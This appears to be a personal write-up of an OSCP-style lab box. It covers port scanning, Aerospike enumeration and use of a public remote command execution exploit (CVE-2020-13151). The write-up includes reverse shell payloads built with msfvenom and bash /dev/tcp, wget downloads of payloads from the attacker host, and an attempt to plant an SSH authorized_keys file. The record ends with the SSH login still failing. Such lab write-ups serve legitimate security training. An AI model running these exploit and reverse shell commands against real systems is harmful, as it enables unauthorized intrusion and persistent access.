IP: 192.168.237.143

# Nmap

```bash
sudo nmap -v -Pn -p- -T4 -oN tcp_ports.nmap 192.168.237.143

sudo nmap -v -Pn -p $(cat tcp_ports.nmap | grep -Eo '([0-9]{1,5})/tcp' | awk -F '/' '{print $1}' | paste -sd ',') -sV -sC -oN tcp_services.nmap 192.168.237.143
```

# MySQL

```bash
# As "anonymous" user
mysql -h 192.168.237.143 -u "" -p
# Host '192.168.45.250' is not allowed to connect to this MySQL server
# Check localhost access later
```

# PostgreSQL

```bash
psql -h 192.168.237.143 -U root
# Failed

psql -h 192.168.237.143 -U postgres
# Failed
```

# FTP

```bash
ftp anonymous@192.168.237.143
# Failed: incorrect pass?
```

# Port 3000

Enum port 3003:
```bash
nc -vn 192.168.237.143 3003
(UNKNOWN) [192.168.237.143] 3003 (?) open
help
bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;
bins
test:bin_names=0,bin_names_quota=65535;bar:bin_names=0,bin_names_quota=65535;
name
BB91E379E565000
log

log-message

sets

show-devices

name
BB91E379E565000
version
Aerospike Community Edition build 5.1.0.1
```

Search exploit:
```bash
searchsploit Aerospike

# Aerospike Database 5.1.0.3 - OS Command Execution  | multiple/remote/49067.py
```

The exploit requires the python package "aerospike":
```bash
virtualenv .venv
source .venv/bin/activate
pip3 install aerospike
```

The exploit also requires a poc.lua file. Found one here (download it):
```
https://github.com/b4ny4n/CVE-2020-13151/blob/master/poc.lua
```

Tested the exploit on ports 3000,3001,3003. Worked on port 3000:
```bash
python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd 'curl 192.168.45.250'
# works!
```

Enum OS:
```bash
python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd 'uname -a'
# Linux oscp 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

## Upload reverse shell

Create reverse shell with msfvenom:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=4444 -f elf > rshell
```

Use the exploit to upload and execute the reverse shell:
```bash
python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd 'wget http://192.168.45.250/rshell -o /home/aero/rshell'

python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd 'chmod +x /tmp/rshell'

python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd '/tmp/rshell'
```
=> didnt work

```bash
python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd 'bash -c "bash -i >& /dev/tcp/192.168.45.250/4444 0>&1"'
```
=> didnt work

```bash
python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd 'bash -i >& /dev/tcp/192.168.45.250/4444 0>&1'
```
=> didnt work

## Upload SSH key

Its even easier and better to upload a ssh key:
```bash
python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd 'whoami'
# aero

python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd 'ls -la /home/aero'
# drwxr-xr-x 4 aero aero 4096 Mar 16  2022 .
# drwxr-xr-x 3 root root 4096 May 10  2021 ..
# lrwxrwxrwx 1 root root    9 May 10  2021 .bash_history -> /dev/null
# -rw-r--r-- 1 aero aero 3771 Feb 25  2020 .bashrc
# drwx------ 2 aero aero 4096 May 10  2021 .cache
# -rw-r--r-- 1 aero aero  807 Feb 25  2020 .profile
# -rw-r--r-- 1 root root   33 Nov  2 12:30 local.txt
# drwx------ 3 aero aero 4096 Mar 16  2022 snap

python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd 'mkdir /home/aero/.ssh'
# worked
```

Create ssh key:
```bash
ssh-keygen
```

Add the public key to the file "authorized_keys" and download it:
```bash
# Since the authorized_keys is a new file its really just a copy of the pub key
cp id_aero.pub authorized_keys

python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd 'wget http://192.168.45.250/authorized_keys -o /home/aero/.ssh/authorized_keys'

python3 49067.py --ahost 192.168.237.143 --aport 3000 --cmd 'cat /home/aero/.ssh/authorized_keys'
```

Login:
```bash
ssh aero@192.168.237.143 -i ../staging/id_aero
```
=> doesnt work, still asking for pw